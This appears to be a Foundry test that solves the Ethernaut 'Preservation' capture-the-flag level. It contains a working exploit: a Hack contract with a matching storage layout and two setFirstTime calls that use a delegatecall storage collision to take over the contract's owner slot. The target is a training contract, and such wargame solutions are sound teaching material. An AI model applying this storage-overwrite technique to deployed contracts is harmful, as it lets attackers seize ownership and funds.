pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/Preservation/PreservationHack.sol";
import "../../src/Preservation/PreservationFactory.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";

contract PreservationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testPreservationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(preservationFactory);
        Preservation ethernautPreservation = Preservation(payable(levelAddress));
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        //attack is as follows:
        //first delegatecall will set timeZone1Library to address(this)
        //second delegatecall will run address(this).setTime(tx.origin) to set slot 2 to tx.origin

        Hack hack = new Hack();
        ethernautPreservation.setFirstTime(uint160(address(hack)));
        ethernautPreservation.setFirstTime(uint160(tx.origin));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////   

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }

}

contract Hack {
    uint a;
    uint b;
    address owner;

    function setTime(uint) public {
        owner = tx.origin;
    }
}